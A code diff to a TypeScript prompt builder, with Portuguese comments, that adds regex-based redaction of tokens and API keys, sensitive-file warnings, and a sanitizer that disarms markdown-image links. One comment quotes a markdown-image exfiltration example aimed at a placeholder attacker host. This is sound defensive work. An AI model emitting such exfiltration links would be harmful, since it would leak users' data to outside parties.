@@ -1,5 +1,61 @@
 import type { SelectedElement, PromptTemplate } from '@/types/prompt';
 import type { SupportedFramework } from '@/types/project';
+import { isSensitivePath } from '@/services/fileSystem';
+
+/**
+ * Redacts known sensitive patterns (GitHub PATs, API keys, Bearer tokens, private keys)
+ * from code snippets and prompt text to prevent accidental leaks to LLMs.
+ */
+export function redactSecrets(text: string): string {
+  if (!text) return '';
+  return text
+    // GitHub PAT classic (ghp_...)
+    .replace(/ghp_[a-zA-Z0-9]{36}/g, 'ghp_REDACTED_PAT')
+    // GitHub Fine-grained PAT (github_pat_...)
+    .replace(/github_pat_[a-zA-Z0-9_]+/g, 'github_pat_REDACTED_TOKEN')
+    // GitHub OAuth tokens (gho_...)
+    .replace(/gho_[a-zA-Z0-9]{36}/g, 'gho_REDACTED_OAUTH')
+    // GitHub App User / Server / Refresh tokens
+    .replace(/ghu_[a-zA-Z0-9]{36}/g, 'ghu_REDACTED')
+    .replace(/ghs_[a-zA-Z0-9]{36}/g, 'ghs_REDACTED')
+    .replace(/ghr_[a-zA-Z0-9]{36}/g, 'ghr_REDACTED')
+    // Google Gemini / Firebase API key (AIzaSy...)
+    .replace(/AIzaSy[0-9A-Za-z_-]{30,40}/g, 'AIzaSy_REDACTED_KEY')
+    // OpenAI / Anthropic API keys (sk-...)
+    .replace(/sk-(?:proj-|live-|ant-)?[a-zA-Z0-9_-]{20,}/g, 'sk_REDACTED_KEY')
+    // AWS Access Key ID (AKIA...)
+    .replace(/AKIA[0-9A-Z]{16}/g, 'AKIA_REDACTED_AWS')
+    // Bearer authentication tokens
+    .replace(/Bearer\s+[a-zA-Z0-9_\-\.]{15,}/gi, 'Bearer REDACTED_TOKEN')
+    // Private cryptographic keys
+    .replace(/-----BEGIN [A-Z ]+PRIVATE KEY-----[\s\S]*?-----END [A-Z ]+PRIVATE KEY-----/g, '/* [REDACTED_PRIVATE_KEY] */')
+    // Generic API keys/secrets assignments in code: apiKey = "...", secret: "..."
+    .replace(
+      /((?:api[_-]?key|client[_-]?secret|auth[_-]?token|secret[_-]?key|access[_-]?token|private[_-]?key)\s*[:=]\s*['"])([^'"]{6,})(['"])/gi,
+      '$1[REDACTED_SECRET]$3'
+    );
+}
+
+/**
+ * Calculates the required number of backticks for markdown fencing to prevent
+ * code snippets with backticks from breaking the outer markdown structure.
+ */
+export function createSafeMarkdownFence(snippet: string): string {
+  const backtickMatches = snippet.match(/`+/g) || [];
+  const maxBackticks = backtickMatches.reduce((max, m) => Math.max(max, m.length), 0);
+  return '`'.repeat(Math.max(3, maxBackticks + 1));
+}
+
+/**
+ * Sanitizes user goal input against secrets and markdown image exfiltration vectors.
+ */
+export function sanitizeUserGoal(goal: string): string {
+  if (!goal) return '';
+  let cleaned = redactSecrets(goal.trim());
+  // Disarm markdown image exfiltration (e.g. ![leak](https://attacker.com/?data=...))
+  cleaned = cleaned.replace(/!\[(.*?)\]\((https?:\/\/[^\s)]+)\)/gi, '[Imagem externa desarmada: $1]');
+  return cleaned;
+}
 
 export function generatePromptText(
   template: PromptTemplate,
@@ -21,7 +77,8 @@ export function generatePromptText(
 
   // Goal
   lines.push(`## Objetivo Solicitado`);
-  lines.push(userGoal || template.defaultGoal);
+  const sanitizedGoal = sanitizeUserGoal(userGoal);
+  lines.push(sanitizedGoal || template.defaultGoal);
   lines.push(``);
 
   // Selected Elements
@@ -36,13 +93,18 @@ export function generatePromptText(
       lines.push(`### ${index + 1}. [${el.nodeType.toUpperCase()}] ${el.label}`);
       if (el.filePath) {
         lines.push(`- **Arquivo:** \`${el.filePath}\``);
+        if (isSensitivePath(el.filePath)) {
+          lines.push(`> ⚠️ **Aviso de Segurança:** O arquivo selecionado (\`${el.filePath}\`) pode conter credenciais. Verifique os dados antes de submeter.`);
+        }
       }
       if (el.codeSnippet) {
         const lang = detectSnippetLanguage(el.filePath);
+        const fence = createSafeMarkdownFence(el.codeSnippet);
+        const safeSnippet = redactSecrets(el.codeSnippet.trim());
         lines.push(`- **Código / Trecho Relevante:**`);
-        lines.push('```' + lang);
-        lines.push(el.codeSnippet.trim());
-        lines.push('```');
+        lines.push(`${fence}${lang}`);
+        lines.push(safeSnippet);
+        lines.push(fence);
       }
       lines.push(``);
     });
@@ -51,6 +113,13 @@ export function generatePromptText(
   // Framework Best Practices
   lines.push(`## Boas Práticas da Arquitetura (${framework.toUpperCase()})`);
   lines.push(getFrameworkGuidance(framework));
+  lines.push(``);
+
+  // Security Directives
+  lines.push(`## Diretrizes de Segurança e Boas Práticas`);
+  lines.push(`- **Sanitização:** Garanta que dados dinâmicos sejam sempre validados e escapados contra ataques XSS e injeção.`);
+  lines.push(`- **Segredos:** Nunca insira credenciais, chaves de API ou senhas diretamente no código cliente.`);
+  lines.push(`- **Robustez:** Trate estados de carregamento e erros de rede de forma graciosa na interface.`);
   lines.push(``);
 
   // Instructions
@@ -110,4 +179,3 @@ export function estimateTokens(text: string): number {
   // Good rule of thumb for English/Portuguese code & text: ~4 characters per token
   return Math.ceil(text.length / 4);
 }
-
